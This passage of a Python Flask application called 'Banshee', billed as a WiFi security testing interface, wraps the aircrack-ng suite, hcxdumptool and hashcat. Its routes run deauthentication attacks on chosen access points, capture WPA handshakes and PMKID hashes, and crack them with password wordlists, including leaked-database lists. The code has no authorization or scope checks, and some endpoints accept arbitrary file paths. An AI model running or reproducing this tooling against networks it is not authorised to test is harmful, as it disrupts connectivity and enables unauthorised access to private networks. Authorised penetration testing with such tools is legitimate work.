"""
Banshee — WiFi security testing interface
Wraps aircrack-ng suite with a Flask UI.
Port: 5200
"""

import csv
import glob
import json
import os
import shutil
import signal
import subprocess
import threading
import time
from datetime import datetime
from flask import Flask, jsonify, render_template, request

app = Flask(__name__)

# ── OUI lookup ────────────────────────────────────────────────────
def _load_oui():
    db = {}
    try:
        with open('/usr/share/ieee-data/oui.txt', errors='ignore') as f:
            for line in f:
                if '(hex)' in line:
                    parts = line.split('(hex)')
                    prefix = parts[0].strip().replace('-', '').upper()
                    vendor = parts[1].strip()
                    if prefix and vendor:
                        db[prefix] = vendor
    except Exception:
        pass
    return db

OUI = _load_oui()

def oui_lookup(mac):
    return OUI.get(mac.replace(':', '').replace('-', '')[:6].upper(), '')

# ── Config ────────────────────────────────────────────────────────
IFACE_MANAGED  = 'wlxe84e06a00bc4'   # RTL8812AU managed interface
SCAN_PREFIX    = '/tmp/banshee_scan'
CAP_PREFIX     = '/tmp/banshee_cap'
WORDLIST       = '/usr/share/wordlists/rockyou.txt'
CAPTURES_DIR   = os.path.expanduser('~/Projects/banshee/captures')
PMKID_PREFIX   = '/tmp/banshee_pmkid'
os.makedirs(CAPTURES_DIR, exist_ok=True)

# Best-effort cleanup of leftover tmp cap files from previous runs
for _f in glob.glob(f'{CAP_PREFIX}_*'):
    try: os.remove(_f)
    except: pass

# ── State ─────────────────────────────────────────────────────────
lock  = threading.Lock()
state = {
    'monitor_mode':   False,
    'mon_iface':      None,
    'mode':           'idle',   # idle | scanning | attacking | capturing | cracking
    'handshake':      False,
    'handshake_file': None,     # cap file where handshake was confirmed — locked in
    'capture_bssid':  None,
    'cap_prefix':     None,     # per-session prefix, set fresh each capture_start
    'crack_result':   None,     # None | 'running' | 'found:KEY' | 'not_found'
    'selected':       None,     # {bssid, essid, channel, privacy}
    'pmkid_prefix':   None,
    'pmkid_count':    0,
    'wps_result':     None,   # None | 'running' | 'found:PIN:PSK' | 'not_found'
}
procs     = {}   # name → Popen
crack_log = []
wps_data  = {}   # bssid → {wps, locked, vendor}
wps_log   = []

# ── Helpers ───────────────────────────────────────────────────────
def run(cmd, timeout=15):
    return subprocess.run(cmd, capture_output=True, text=True,
                          stdin=subprocess.DEVNULL, timeout=timeout)

def kill_proc(name):
    p = procs.pop(name, None)
    if p and p.poll() is None:
        try:
            os.killpg(os.getpgid(p.pid), signal.SIGTERM)
        except Exception:
            try: p.terminate()
            except Exception: pass

def find_mon_iface():
    """Find the first interface currently in monitor mode."""
    r = run(['iw', 'dev'])
    iface = None
    for line in r.stdout.splitlines():
        s = line.strip()
        if s.startswith('Interface'):
            iface = s.split()[1]
        if 'type monitor' in s and iface:
            return iface
    return None

def parse_airodump_csv():
    """Parse the latest airodump-ng CSV. Returns (aps, clients)."""
    files = sorted(glob.glob(f'{SCAN_PREFIX}-*.csv'))
    if not files:
        return [], []
    try:
        with open(files[-1], 'r', errors='ignore') as f:
            content = f.read()
    except Exception:
        return [], []

    # airodump-ng separates AP and client sections with two blank lines
    if '\r\n\r\n\r\n' in content:
        sections = content.split('\r\n\r\n\r\n', 1)
    elif '\n\n\n' in content:
        sections = content.split('\n\n\n', 1)
    elif '\r\n\r\n' in content:
        sections = content.split('\r\n\r\n', 1)
    else:
        sections = content.split('\n\n', 1)

    aps, clients = [], []

    # AP section
    skip = {'BSSID', ''}
    for row in csv.reader(sections[0].splitlines()):
        if not row or row[0].strip() in skip:
            continue
        if len(row) < 14:
            continue
        bssid = row[0].strip()
        if not bssid or len(bssid) < 17:
            continue
        aps.append({
            'bssid':   bssid,
            'channel': row[3].strip(),
            'speed':   row[4].strip(),
            'privacy': row[5].strip(),
            'power':   row[8].strip(),
            'beacons': row[9].strip(),
            'essid':   row[13].strip(),
            'vendor':  oui_lookup(bssid),
        })

    # Client section
    if len(sections) > 1:
        skip_c = {'Station MAC', ''}
        for row in csv.reader(sections[1].splitlines()):
            if not row or row[0].strip() in skip_c:
                continue
            if len(row) < 6:
                continue
            mac = row[0].strip()
            if not mac or len(mac) < 17:
                continue
            clients.append({
                'mac':     mac,
                'power':   row[3].strip(),
                'packets': row[4].strip(),
                'bssid':   row[5].strip(),
                'probed':  row[6].strip() if len(row) > 6 else '',
                'vendor':  oui_lookup(mac),
            })

    return aps, clients

def inspect_wpa_capture(cap_file, bssid=''):
    """Inspect a .cap file and report whether it contains a usable WPA handshake."""
    if not cap_file or not os.path.exists(cap_file):
        return {
            'type': 'wpa',
            'valid': False,
            'level': 'missing',
            'label': 'No capture file',
            'size': 0,
            'details': [],
        }
    size = os.path.getsize(cap_file)
    details = [f'{size // 1024} KB'] if size else ['empty file']
    try:
        cmd = ['aircrack-ng']
        if bssid:
            cmd += ['--bssid', bssid]
        cmd.append(cap_file)
        r = subprocess.run(
            cmd,
            capture_output=True, text=True, stdin=subprocess.DEVNULL, timeout=8)
        out = r.stdout.lower()
        valid = 'potential targets' in out and '0 potential targets' not in out
        if valid:
            return {
                'type': 'wpa',
                'valid': True,
                'level': 'good',
                'label': 'Verified handshake',
                'size': size,
                'details': details + ['aircrack-ng found a target'],
            }
        return {
            'type': 'wpa',
            'valid': False,
            'level': 'weak' if size else 'empty',
            'label': 'No handshake yet',
            'size': size,
            'details': details + ['aircrack-ng found 0 targets'],
        }
    except Exception as e:
        return {
            'type': 'wpa',
            'valid': False,
            'level': 'error',
            'label': 'Inspect failed',
            'size': size,
            'details': details + [str(e)],
        }

def check_handshake(bssid, cap_prefix=None):
    """Return True if a WPA handshake for bssid exists in this session's capture files."""
    prefix = cap_prefix or CAP_PREFIX
    caps = sorted(glob.glob(f'{prefix}-*.cap'))
    if not caps:
        return False
    return inspect_wpa_capture(caps[-1], bssid).get('valid', False)

def tool_path(name):
    import shutil as _sh
    return _sh.which(name)

def count_pmkids(pcapng):
    """Count PMKID hashes in a pcapng by converting via hcxpcapngtool."""
    if not pcapng or not os.path.exists(pcapng):
        return 0
    tmp = pcapng + '.hc22000'
    try:
        subprocess.run(['hcxpcapngtool', '-o', tmp, pcapng],
                       capture_output=True, timeout=5)
        if os.path.exists(tmp):
            with open(tmp) as f:
                n = sum(1 for l in f if l.strip())
            try: os.remove(tmp)
            except: pass
            return n
    except Exception:
        pass
    return 0

def inspect_pmkid_capture(pcapng):
    """Inspect a pcapng and report whether it contains crackable PMKID hashes."""
    if not pcapng or not os.path.exists(pcapng):
        return {
            'type': 'pmkid',
            'valid': False,
            'level': 'missing',
            'label': 'No PMKID file',
            'size': 0,
            'hashes': 0,
            'details': [],
        }
    size = os.path.getsize(pcapng)
    hashes = count_pmkids(pcapng)
    return {
        'type': 'pmkid',
        'valid': hashes > 0,
        'level': 'good' if hashes > 0 else ('weak' if size else 'empty'),
        'label': f'{hashes} PMKID hash{"es" if hashes != 1 else ""}' if hashes else 'No PMKID hash',
        'size': size,
        'hashes': hashes,
        'details': [f'{size // 1024} KB', 'hcxpcapngtool verified' if hashes else 'hcxpcapngtool found 0 hashes'],
    }

def sidecar_path(path):
    return path + '.json'

def write_capture_meta(path, method, validation=None):
    selected = state.get('selected') or {}
    meta = {
        'file': os.path.basename(path),
        'path': path,
        'method': method,
        'ts': int(time.time()),
        'ssid': selected.get('essid', ''),
        'bssid': selected.get('bssid', ''),
        'channel': selected.get('channel', ''),
        'privacy': selected.get('privacy', ''),
        'validation': validation,
    }
    try:
        with open(sidecar_path(path), 'w', encoding='utf-8') as f:
            json.dump(meta, f, indent=2)
            f.write('\n')
    except Exception:
        pass
    return meta

def read_capture_meta(path):
    try:
        with open(sidecar_path(path), encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return {}

def parse_wash_line(line):
    """Parse a wash output line → (bssid, info_dict) or (None, None)."""
    p = line.split()
    if len(p) < 5:
        return None, None
    bssid = p[0].upper()
    if len(bssid) != 17 or bssid.count(':') != 5:
        return None, None
    try:
        return bssid, {
            'wps':    p[3],
            'locked': p[4].lower() in ('yes', '1', 'true'),
            'vendor': ' '.join(p[5:]) if len(p) > 5 else '',
        }
    except Exception:
        return None, None

# ── Interface ─────────────────────────────────────────────────────
@app.route('/api/interface/monitor', methods=['POST'])
def enable_monitor():
    with lock:
        if state['monitor_mode']:
            return jsonify({'ok': True, 'iface': state['mon_iface']})
        run(['sudo', 'nmcli', 'device', 'set', IFACE_MANAGED, 'managed', 'no'])
        run(['sudo', 'ip', 'link', 'set', IFACE_MANAGED, 'down'])
        run(['sudo', 'iw', 'reg', 'set', 'SI'])
        run(['sudo', 'iw', 'dev', IFACE_MANAGED, 'set', 'type', 'monitor'])
        run(['sudo', 'ip', 'link', 'set', IFACE_MANAGED, 'up'])
        # Verify mode changed
        r = run(['iw', 'dev'])
        if 'type monitor' in r.stdout:
            mon = find_mon_iface() or IFACE_MANAGED
        else:
            mon = IFACE_MANAGED  # RTL8812AU may not report type monitor but still work
        state['monitor_mode'] = True
        state['mon_iface'] = mon
        return jsonify({'ok': True, 'iface': mon})

@app.route('/api/interface/managed', methods=['POST'])
def disable_monitor():
    with lock:
        if not state['monitor_mode']:
            return jsonify({'ok': True})
        # Kill all adapter-dependent processes before switching mode
        for name in ('scan', 'capture', 'attack', 'pmkid', 'wps'):
            kill_proc(name)
        state['mode'] = 'idle'
        run(['sudo', 'ip', 'link', 'set', IFACE_MANAGED, 'down'])
        run(['sudo', 'iw', 'dev', IFACE_MANAGED, 'set', 'type', 'managed'])
        run(['sudo', 'ip', 'link', 'set', IFACE_MANAGED, 'up'])
        run(['sudo', 'nmcli', 'device', 'set', IFACE_MANAGED, 'managed', 'yes'])
        state['monitor_mode'] = False
        state['mon_iface'] = None
        return jsonify({'ok': True})

@app.route('/api/interface/status')
def iface_status():
    with lock:
        cap_proc = procs.get('capture')
        return jsonify({
            'monitor_mode':  state['monitor_mode'],
            'mon_iface':     state['mon_iface'],
            'managed_iface': IFACE_MANAGED,
            'mode':          state['mode'],
            'capturing':     cap_proc is not None and cap_proc.poll() is None,
        })

# ── Scan ──────────────────────────────────────────────────────────
@app.route('/api/scan/start', methods=['POST'])
def scan_start():
    with lock:
        if not state['monitor_mode']:
            return jsonify({'ok': False, 'error': 'Monitor mode required'}), 400
        if state['mode'] not in ('idle', 'cracking'):
            return jsonify({'ok': False, 'error': f'Busy: {state["mode"]}'}), 400
        for f in glob.glob(f'{SCAN_PREFIX}-*'):
            try: os.remove(f)
            except: pass
        # Limit channel hop to real-world WiFi channels only.
        # RTL8812AU driver exposes ~60 non-standard freqs (5075, 5080...) which
        # causes airodump-ng to spend almost no time on actual 5GHz AP channels.
        CHANNELS = '1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165'
        cmd = ['sudo', 'airodump-ng',
               '--channel', CHANNELS,
               '--output-format', 'csv',
               '--write', SCAN_PREFIX,
               state['mon_iface']]
        p = subprocess.Popen(cmd,
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL,
                             preexec_fn=os.setsid)
        procs['scan'] = p
        state['mode'] = 'scanning'
        return jsonify({'ok': True})

@app.route('/api/scan/stop', methods=['POST'])
def scan_stop():
    with lock:
        kill_proc('scan')
        if state['mode'] == 'scanning':
            state['mode'] = 'idle'
        return jsonify({'ok': True})

@app.route('/api/scan/results')
def scan_results():
    aps, clients = parse_airodump_csv()
    for ap in aps:
        ap['wps'] = wps_data.get(ap['bssid'].upper())
    return jsonify({'aps': aps, 'clients': clients})

# ── Target ────────────────────────────────────────────────────────
@app.route('/api/target', methods=['POST'])
def set_target():
    data = request.json or {}
    with lock:
        state['selected'] = {
            'bssid':   data.get('bssid', ''),
            'essid':   data.get('essid', ''),
            'channel': data.get('channel', ''),
            'privacy': data.get('privacy', ''),
        }
    return jsonify({'ok': True})

@app.route('/api/target')
def get_target():
    with lock:
        return jsonify(state['selected'] or {})

# ── Attack ────────────────────────────────────────────────────────
@app.route('/api/attack/deauth', methods=['POST'])
def attack_deauth():
    data = request.json or {}
    with lock:
        if not state['monitor_mode']:
            return jsonify({'ok': False, 'error': 'Monitor mode required'}), 400
        bssid  = data.get('bssid') or (state['selected'] or {}).get('bssid', '')
        client = data.get('client', 'FF:FF:FF:FF:FF:FF') or 'FF:FF:FF:FF:FF:FF'
        count  = str(data.get('count', 0))
        if not bssid:
            return jsonify({'ok': False, 'error': 'No target BSSID'}), 400
        kill_proc('attack')
        cmd = ['sudo', 'aireplay-ng',
               '-0', count,
               '-a', bssid,
               '-c', client,
               state['mon_iface']]
        p = subprocess.Popen(cmd,
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL,
                             preexec_fn=os.setsid)
        procs['attack'] = p
        prev_mode = state['mode']
        state['mode'] = 'attacking'
        state['_prev_mode'] = prev_mode
        return jsonify({'ok': True})

@app.route('/api/attack/stop', methods=['POST'])
def attack_stop():
    with lock:
        kill_proc('attack')
        if state['mode'] == 'attacking':
            state['mode'] = state.get('_prev_mode', 'idle')
        return jsonify({'ok': True})

# ── Capture ───────────────────────────────────────────────────────
@app.route('/api/capture/start', methods=['POST'])
def capture_start():
    data = request.json or {}
    with lock:
        if not state['monitor_mode']:
            return jsonify({'ok': False, 'error': 'Monitor mode required'}), 400
        bssid   = data.get('bssid') or (state['selected'] or {}).get('bssid', '')
        channel = data.get('channel') or (state['selected'] or {}).get('channel', '')
        if not bssid or not channel:
            return jsonify({'ok': False, 'error': 'BSSID and channel required'}), 400
        kill_proc('scan')  # stop scan — can't channel-hop while capturing
        if state['mode'] == 'scanning':
            state['mode'] = 'idle'
        cap_prefix = f'{CAP_PREFIX}_{int(time.time())}'
        # Best-effort cleanup of previous session files (may fail if root-owned)
        old = glob.glob(f'{CAP_PREFIX}_*')
        for f in old:
            try: os.remove(f)
            except: pass
        state['handshake']       = False
        state['handshake_file']  = None
        state['capture_bssid']   = bssid
        state['cap_prefix']      = cap_prefix
        cmd = ['sudo', 'airodump-ng',
               '-c', channel,
               '--bssid', bssid,
               '-w', cap_prefix,
               '--output-format', 'cap',
               state['mon_iface']]
        p = subprocess.Popen(cmd,
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL,
                             preexec_fn=os.setsid)
        procs['capture'] = p
        state['mode'] = 'capturing'
        return jsonify({'ok': True})

@app.route('/api/capture/stop', methods=['POST'])
def capture_stop():
    with lock:
        kill_proc('capture')
        if state['mode'] == 'capturing':
            state['mode'] = 'idle'
        return jsonify({'ok': True})

@app.route('/api/capture/status')
def capture_status():
    # Read state without holding lock during the slow aircrack-ng check
    with lock:
        bssid         = state.get('capture_bssid', '')
        already_found = state['handshake']
        cap_prefix    = state.get('cap_prefix') or CAP_PREFIX
        cap_proc      = procs.get('capture')
    caps = sorted(glob.glob(f'{cap_prefix}-*.cap'))
    handshake = already_found
    handshake_file = state.get('handshake_file')
    latest_cap = caps[-1] if caps else None
    validation = inspect_wpa_capture(None, bssid)
    if already_found:
        cap_file_for_inspect = handshake_file or latest_cap
        if cap_file_for_inspect:
            validation = inspect_wpa_capture(cap_file_for_inspect, bssid)
    elif bssid and latest_cap:
        validation = inspect_wpa_capture(latest_cap, bssid)
        handshake = validation.get('valid', False)
        if handshake:
            handshake_file = latest_cap
            # Auto-save to captures dir
            saved_path = None
            if handshake_file and os.path.exists(handshake_file):
                essid = (state.get('selected') or {}).get('essid', '') or 'unknown'
                safe_essid = ''.join(c if c.isalnum() or c in '-_' else '_' for c in essid)[:32]
                ts = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
                saved_path = os.path.join(CAPTURES_DIR, f'{ts}_{safe_essid}.cap')
                try:
                    shutil.copy2(handshake_file, saved_path)
                    write_capture_meta(saved_path, 'wpa-handshake-auto', inspect_wpa_capture(saved_path, bssid))
                except Exception:
                    saved_path = None
            with lock:
                state['handshake']      = True
                state['handshake_file'] = saved_path or handshake_file
            if saved_path:
                validation = inspect_wpa_capture(saved_path, bssid)
            # Auto-stop capture
            kill_proc('capture')
            with lock:
                if state['mode'] == 'capturing':
                    state['mode'] = 'idle'
    capturing = (cap_proc is not None and cap_proc.poll() is None)
    # Once handshake is confirmed, always return that specific file for cracking
    cap_file = handshake_file if handshake else (caps[-1] if caps else None)
    return jsonify({
        'capturing': capturing,
        'handshake': handshake,
        'cap_file':  cap_file,
        'validation': validation,
    })

# ── Saves ─────────────────────────────────────────────────────────
@app.route('/api/capture/save', methods=['POST'])
def capture_save():
    cap_prefix = state.get('cap_prefix') or CAP_PREFIX
    caps = sorted(glob.glob(f'{cap_prefix}-*.cap'))
    if not caps:
        return jsonify({'ok': False, 'error': 'No capture file to save'}), 400
    src = caps[-1]
    essid = (state.get('selected') or {}).get('essid', '') or 'unknown'
    safe_essid = ''.join(c if c.isalnum() or c in '-_' else '_' for c in essid)[:32]
    ts = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    dst = os.path.join(CAPTURES_DIR, f'{ts}_{safe_essid}.cap')
    try:
        shutil.copy2(src, dst)
        write_capture_meta(dst, 'wpa-manual-save', inspect_wpa_capture(dst, (state.get('selected') or {}).get('bssid', '')))
        return jsonify({'ok': True, 'file': os.path.basename(dst)})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 500

@app.route('/api/saves')
def saves_list():
    files = []
    for pattern, ftype in [('*.cap', 'wpa'), ('*.pcapng', 'pmkid')]:
        for f in glob.glob(os.path.join(CAPTURES_DIR, pattern)):
            stat = os.stat(f)
            meta = read_capture_meta(f)
            validation = meta.get('validation')
            if not validation:
                validation = inspect_pmkid_capture(f) if ftype == 'pmkid' else {
                    'type': 'wpa',
                    'valid': stat.st_size > 0,
                    'level': 'unknown',
                    'label': 'Saved capture',
                    'size': stat.st_size,
                    'details': ['inspect before cracking'],
                }
            files.append({
                'name':     os.path.basename(f),
                'path':     f,
                'size':     stat.st_size,
                'modified': int(stat.st_mtime),
                'type':     ftype,
                'validation': validation,
                'meta': meta,
            })
    files.sort(key=lambda x: x['modified'], reverse=True)
    return jsonify(files)

@app.route('/api/capture/reset-handshake', methods=['POST'])
def reset_handshake():
    with lock:
        state['handshake']      = False
        state['handshake_file'] = None
    return jsonify({'ok': True})

@app.route('/api/saves/<filename>', methods=['DELETE'])
def save_delete(filename):
    if '/' in filename or '..' in filename:
        return jsonify({'ok': False, 'error': 'Invalid filename'}), 400
    if not (filename.endswith('.cap') or filename.endswith('.pcapng')):
        return jsonify({'ok': False, 'error': 'Invalid file type'}), 400
    path = os.path.join(CAPTURES_DIR, filename)
    if not os.path.exists(path):
        return jsonify({'ok': False, 'error': 'File not found'}), 404
    try:
        os.remove(path)
        try: os.remove(sidecar_path(path))
        except Exception: pass
        return jsonify({'ok': True})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 500

@app.route('/api/saves/<filename>/inspect', methods=['POST'])
def save_inspect(filename):
    if '/' in filename or '..' in filename:
        return jsonify({'ok': False, 'error': 'Invalid filename'}), 400
    if not (filename.endswith('.cap') or filename.endswith('.pcapng')):
        return jsonify({'ok': False, 'error': 'Invalid file type'}), 400
    path = os.path.join(CAPTURES_DIR, filename)
    if not os.path.exists(path):
        return jsonify({'ok': False, 'error': 'File not found'}), 404
    selected = state.get('selected') or {}
    validation = inspect_pmkid_capture(path) if filename.endswith('.pcapng') else inspect_wpa_capture(path, selected.get('bssid', ''))
    meta = write_capture_meta(path, 'manual-inspect', validation)
    return jsonify({'ok': True, 'validation': validation, 'meta': meta})

# ── Wordlists ─────────────────────────────────────────────────────
WORDLIST_DIRS = [
    ('/usr/share/wordlists',                              'wordlists'),
    (os.path.expanduser('~/Projects/banshee/wordlists'),  'custom'),
    ('/usr/share/seclists/Passwords',                    'seclists/Passwords'),
    ('/usr/share/seclists/Passwords/Common-Credentials', 'seclists/Common'),
    ('/usr/share/seclists/Passwords/Leaked-Databases',   'seclists/Leaked'),
]

@app.route('/api/wordlists')
def wordlists_list():
    found, seen = [], set()
    for d, group in WORDLIST_DIRS:
        if not os.path.isdir(d):
            continue
        for name in sorted(os.listdir(d)):
            if not (name.endswith('.txt') or name.endswith('.lst')):
                continue
            path = os.path.join(d, name)
            if path in seen or not os.path.isfile(path):
                continue
            seen.add(path)
            size = os.path.getsize(path)
            if size < 100:
                continue
            found.append({'name': name, 'path': path, 'size': size, 'group': group})
    # rockyou first, then largest first within each group
    found.sort(key=lambda x: (0 if 'rockyou' in x['name'].lower() else 1, -x['size']))
    return jsonify(found)

@app.route('/api/wordlist/build-top', methods=['POST'])
def build_top_candidates():
    data  = request.json or {}
    top_n = max(100, min(10000, int(data.get('top_n', 1000))))

    # Sequential/pattern files are not frequency-sorted — skip them
    skip_prefixes = ('isp-',)
    small_threshold = 500_000  # bytes — include entire file

    small_paths, large_paths = [], []
    seen_paths = set()

    for wdir, _group in WORDLIST_DIRS:
        if not os.path.isdir(wdir):
            continue
        for name in sorted(os.listdir(wdir)):
            if not (name.endswith('.txt') or name.endswith('.lst')):
                continue
            if name == 'top-candidates.txt':
                continue
            if any(name.startswith(p) for p in skip_prefixes):
                continue
            path = os.path.join(wdir, name)
            if not os.path.isfile(path) or path in seen_paths:
                continue
            seen_paths.add(path)
            size = os.path.getsize(path)
            if size < 100:
                continue
            (small_paths if size < small_threshold else large_paths).append(path)

    seen   = set()
    result = []

    def ingest_line(pw):
        if pw and not pw.startswith('#') and 8 <= len(pw) <= 63 and pw not in seen:
            seen.add(pw)
            result.append(pw)

    # Small lists first — include everything (router-defaults, slovenian, etc.)
    for path in small_paths:
        try:
            with open(path, encoding='utf-8', errors='ignore') as f:
                for line in f:
                    ingest_line(line.strip())
        except Exception:
            pass

    # Large lists — top N only (rockyou and seclists are already frequency-sorted)
    for path in large_paths:
        count = 0
        try:
            with open(path, encoding='utf-8', errors='ignore') as f:
                for line in f:
                    if count >= top_n:
                        break
                    pw = line.strip()
                    if pw and not pw.startswith('#') and 8 <= len(pw) <= 63 and pw not in seen:
                        seen.add(pw)
                        result.append(pw)
                        count += 1
        except Exception:
            pass

    out_dir  = os.path.expanduser('~/Projects/banshee/wordlists')
    out_path = os.path.join(out_dir, 'top-candidates.txt')
    try:
        with open(out_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(result) + '\n')
        return jsonify({'ok': True, 'count': len(result), 'path': out_path})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 500

# ── Crack ─────────────────────────────────────────────────────────
@app.route('/api/crack/start', methods=['POST'])
def crack_start():
    global crack_log
    data = request.json or {}

    with lock:
        cap_prefix = state.get('cap_prefix') or CAP_PREFIX
        caps       = sorted(glob.glob(f'{cap_prefix}-*.cap'))
        cap_file   = data.get('cap_file') or state.get('handshake_file') or (caps[-1] if caps else None)
        raw        = data.get('wordlists') or ([data['wordlist']] if data.get('wordlist') else [WORDLIST])
        wordlists  = [w for w in raw if w and os.path.exists(w)]
        bssid      = data.get('bssid') or (state['selected'] or {}).get('bssid', '')

    if not cap_file:
        return jsonify({'ok': False, 'error': 'No capture file found'}), 400
    if not os.path.exists(cap_file):
        return jsonify({'ok': False, 'error': f'File not found: {cap_file}'}), 400
    if not wordlists:
        return jsonify({'ok': False, 'error': 'No valid wordlists found'}), 400

    is_pmkid = cap_file.endswith('.pcapng')
    hc_out   = None
    tmp_wl   = None

    if is_pmkid:
        hc22000 = cap_file + '.hc22000'
        subprocess.run(['hcxpcapngtool', '-o', hc22000, cap_file],
                       capture_output=True, timeout=10)
        if not os.path.exists(hc22000) or os.path.getsize(hc22000) == 0:
            return jsonify({'ok': False, 'error': 'No PMKID hashes found in capture file'}), 400
        hc_out   = hc22000 + '.cracked'
        tmp_wl   = hc22000 + '.wordlist'
        try:
            with open(tmp_wl, 'wb') as out:
                for wordlist in wordlists:
                    with open(wordlist, 'rb') as src:
                        shutil.copyfileobj(src, out)
                    out.write(b'\n')
        except Exception as e:
            try: os.remove(tmp_wl)
            except Exception: pass
            return jsonify({'ok': False, 'error': f'Unable to prepare PMKID wordlist: {e}'}), 500
        cmd_list = [
            'hashcat', '-m', '22000', hc22000, tmp_wl,
            '--status', '--status-timer=5',
            '--potfile-disable', '--outfile', hc_out, '--outfile-format', '2',
        ]
    else:
        validation = inspect_wpa_capture(cap_file, bssid)
        if not validation.get('valid'):
            return jsonify({'ok': False, 'error': validation.get('label', 'No verified handshake in capture file')}), 400
        cmd_list = ['aircrack-ng', '-w', ','.join(wordlists), cap_file]
        if bssid:
            cmd_list += ['--bssid', bssid]

    with lock:
        kill_proc('crack')
        crack_log = []
        if is_pmkid:
            crack_log.append('[PMKID] Running hashcat -m 22000 — status updates every 5s below.')
        state['crack_result'] = 'running'
        state['mode']         = 'cracking'
        p = subprocess.Popen(cmd_list,
                             stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT,
                             text=True,
                             preexec_fn=os.setsid)
        procs['crack'] = p

    def reader():
        for line in p.stdout:
            line = line.rstrip()
            crack_log.append(line)
            if not is_pmkid:
                if 'KEY FOUND' in line:
                    with lock:
                        state['crack_result'] = 'found:' + line.strip()
                elif 'KEY NOT FOUND' in line or 'Passphrase not in dictionary' in line:
                    with lock:
                        state['crack_result'] = 'not_found'
        p.wait()
        if is_pmkid:
            try:
                with open(hc_out) as f:
                    pwd = f.read().strip()
                with lock:
                    state['crack_result'] = f'found:{pwd}' if pwd else 'not_found'
            except Exception:
                with lock:
                    state['crack_result'] = 'not_found'
            if tmp_wl:
                try: os.remove(tmp_wl)
                except Exception: pass
        with lock:
            if state['mode'] == 'cracking':
                state['mode'] = 'idle'
            if state['crack_result'] == 'running':
                state['crack_result'] = 'not_found'

    threading.Thread(target=reader, daemon=True).start()
    return jsonify({'ok': True})

@app.route('/api/crack/stop', methods=['POST'])
def crack_stop():
    with lock:
        kill_proc('crack')
        state['crack_result'] = None
        if state['mode'] == 'cracking':
            state['mode'] = 'idle'
        return jsonify({'ok': True})

@app.route('/api/crack/status')
def crack_status():
    with lock:
        return jsonify({
            'cracking': state['mode'] == 'cracking',
            'result':   state['crack_result'],
            'log':      crack_log[-60:],
        })

# ── PMKID ─────────────────────────────────────────────────────────
@app.route('/api/pmkid/start', methods=['POST'])
def pmkid_start():
    with lock:
        if not state['monitor_mode']:
            return jsonify({'ok': False, 'error': 'Monitor mode required'}), 400
        bssid = (state['selected'] or {}).get('bssid', '')
        mon   = state['mon_iface']
        if not bssid:
            return jsonify({'ok': False, 'error': 'No target selected'}), 400
        if not tool_path('hcxdumptool'):
            return jsonify({'ok': False, 'error': 'hcxdumptool not found'}), 400
        # Auto-stop scan before mode check
        kill_proc('scan')
        if state['mode'] == 'scanning':
            state['mode'] = 'idle'
        if state['mode'] not in ('idle', 'cracking'):
            return jsonify({'ok': False, 'error': f'Busy: {state["mode"]}'}), 400
        for f in glob.glob(f'{PMKID_PREFIX}_*'):
            try: os.remove(f)
            except: pass
        prefix = f'{PMKID_PREFIX}_{int(time.time())}'
        state['pmkid_prefix'] = prefix
        state['pmkid_count']  = 0
        channel = str((state['selected'] or {}).get('channel', '') or '6')
        try:
            ch_band = 'b' if int(channel) > 14 else 'a'
        except ValueError:
            ch_band = 'a'
        hcx_channel = f'{channel}{ch_band}'
        cmd = ['sudo', 'hcxdumptool', '-i', mon,
               '-w', f'{prefix}.pcapng',
               '-c', hcx_channel,
               '-p']
        p = subprocess.Popen(cmd,
                             stdin=subprocess.DEVNULL,
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.PIPE,
                             preexec_fn=os.setsid)
        procs['pmkid'] = p
        state['mode'] = 'pmkid'

    def _monitor():
        err = p.stderr.read().decode('utf-8', errors='ignore').strip()
        p.wait()
        crack_log.append(f'[hcxdumptool] exit {p.returncode}: {err[:200] if err else "(no stderr)"}')
        with lock:
            if state['mode'] == 'pmkid' and procs.get('pmkid') is p:
                state['mode'] = 'idle'
    threading.Thread(target=_monitor, daemon=True).start()
    return jsonify({'ok': True})

@app.route('/api/pmkid/stop', methods=['POST'])
def pmkid_stop():
    with lock:
        kill_proc('pmkid')
        if state['mode'] == 'pmkid':
            state['mode'] = 'idle'
    return jsonify({'ok': True})

@app.route('/api/pmkid/status')
def pmkid_status():
    with lock:
        prefix  = state.get('pmkid_prefix')
        running = (procs.get('pmkid') is not None and
                   procs['pmkid'].poll() is None)
    pcapng = f'{prefix}.pcapng' if prefix else None
    exists = bool(pcapng and os.path.exists(pcapng))
    size   = os.path.getsize(pcapng) if exists else 0
    count  = count_pmkids(pcapng) if (exists and not running) else 0
    validation = inspect_pmkid_capture(pcapng) if (exists and not running) else {
        'type': 'pmkid',
        'valid': False,
        'level': 'running' if running else 'missing',
        'label': 'Capturing PMKID...' if running else 'No PMKID file',
        'size': size,
        'hashes': 0,
        'details': [],
    }
    with lock:
        state['pmkid_count'] = count
    return jsonify({'running': running, 'count': count, 'size': size,
                    'file': pcapng if exists else None,
                    'validation': validation})

@app.route('/api/capture/inspect', methods=['POST'])
def capture_inspect():
    data = request.json or {}
    cap_file = data.get('cap_file') or ''
    bssid = data.get('bssid') or (state.get('selected') or {}).get('bssid', '')
    if cap_file.endswith('.pcapng'):
        return jsonify(inspect_pmkid_capture(cap_file))
    return jsonify(inspect_wpa_capture(cap_file, bssid))

@app.route('/api/pmkid/save', methods=['POST'])
def pmkid_save():
    with lock:
        prefix   = state.get('pmkid_prefix')
        selected = state.get('selected') or {}
    pcapng = f'{prefix}.pcapng' if prefix else None
    if not pcapng or not os.path.exists(pcapng):
        return jsonify({'ok': False, 'error': 'No PMKID capture to save'}), 400
    essid = selected.get('essid', '') or 'unknown'
    safe  = ''.join(c if c.isalnum() or c in '-_' else '_' for c in essid)[:32]
    ts    = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    dst   = os.path.join(CAPTURES_DIR, f'{ts}_{safe}_pmkid.pcapng')
    try:
        shutil.copy2(pcapng, dst)
